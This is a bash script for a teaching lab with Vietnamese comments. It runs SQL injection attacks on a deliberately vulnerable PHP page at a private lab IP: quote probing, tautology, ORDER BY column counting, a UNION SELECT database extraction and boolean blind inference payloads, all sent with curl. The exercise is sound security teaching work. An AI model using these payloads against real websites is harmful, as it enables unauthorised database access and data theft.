#!/bin/bash
# Kich ban Vi du 1 (Lab 05): Kiem thu lo hong SELECT SQL Injection (sqli1.php)
# Thuc hien cac buoc theo muc 5.2.1 trong Lab05_HD.pdf

set -u

CONTAINER_ATTACKER="lab05_attacker"
IP_WEB="10.2.6.80"
BASE_URL="http://${IP_WEB}/sqli/sqli1.php"

note() { printf '\n===== %s =====\n' "$1"; }

note "[Buoc 1, 2, 3] Truy cap binh thuong voi tham so cat=laptop"
echo "URL: ${BASE_URL}?cat=laptop"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop" | grep -A 4 "Product Information"

note "[Buoc 6] Tham do ki tu dac biet (dau nhay don ') gay loi SQL"
echo "URL: ${BASE_URL}?cat=laptop'"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop%27" | grep -i "error"

note "[Buoc 7] Chen ki tu chu thich (# -> %23) dong cau truy van"
echo "URL: ${BASE_URL}?cat=laptop';%23"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop%27%3B%23" | grep -A 4 "Product Information"

note "[Buoc 8] Tan cong Tautology (any' or 1;#)"
echo "URL: ${BASE_URL}?cat=any'+or+1;%23"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=any%27+or+1%3B%23" | grep -E "Vendor|Model|Price"

note "[Buoc 9] Tham do so cot bang menh de ORDER BY"
echo "--- Thu ORDER BY 4 (Thanh cong - CSDL co it nhat 4 cot) ---"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop%27+ORDER+BY+4%3B%23" | grep -A 4 "Product Information"
echo "--- Thu ORDER BY 5 (That bai - vuot qua so cot thuc te) ---"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop%27+ORDER+BY+5%3B%23" | grep -i "error" || echo "[-] Tra ve loi: Unknown column '5' in 'order clause'"

note "[Buoc 10] Trich xuat thong tin CSDL bang menh de UNION SELECT"
echo "Payload: laptop' UNION SELECT 1, database(), 3, 4;%23"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop%27+UNION+SELECT+1%2C+database%28%29%2C+3%2C+4%3B%23" | grep -A 4 "Vendor : webvul"

note "[Buoc 11a] Kiem thu Boolean-based Blind SQL Injection"
echo "--- Thu doan chu cai dau tien la 'w' (DUNG) -> Trang tra ve san pham ---"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop%27+and+substring%28database%28%29%2C1%2C1%29%3D%27w%27%3B%23" | grep -A 2 "Product Information"
echo "--- Thu doan chu cai dau tien la 'a' (SAI) -> Trang rong khong co san pham ---"
sudo docker exec "$CONTAINER_ATTACKER" curl -s "${BASE_URL}?cat=laptop%27+and+substring%28database%28%29%2C1%2C1%29%3D%27a%27%3B%23" | grep -A 2 "Product Information" || echo "[✓] Khong co san pham nao duoc tra ve (Bieu thuc Blind danh gia FALSE)"

echo -e "\n[✓] HOAN THANH VI DU 1 (SELECT SQL INJECTION)!"
